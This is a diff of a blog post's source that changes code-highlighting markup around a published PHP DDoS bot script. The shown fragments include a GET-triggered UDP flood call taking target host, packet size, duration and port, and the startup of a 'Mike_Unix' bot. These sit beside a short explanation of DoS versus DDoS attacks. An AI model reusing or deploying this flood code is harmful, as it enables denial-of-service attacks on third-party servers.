@@ -20,7 +20,7 @@ This particular script contained a lot of bad language, which I have censored fo
 
 ### DDoS Script Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?
+{% highlight php %}<?
 if($_GET['act'] == 'lol'){
 udpflood4($_GET['host'], $_GET['psize'], $_GET['time'], $_GET['port']);
 }
@@ -1550,8 +1550,8 @@ udpflood4($_GET['host'], $_GET['psize'], $_GET['time'], $_GET['port']);
     }
     $bot = new Mike_Unix;
     $bot-&gt;start();
-?&gt;
-</pre>
+?>
+{% endhighlight %}
 
 A DoS attack is made by only one person (or computer), while a DDoS attack is made by two or more.  
 Generally a denial of service attack involves sending many &#8211; essentially meaningless &#8211; requests to a server, so the server cannot respond to legitimate queries, either within a reasonable timeframe, or even not at all.
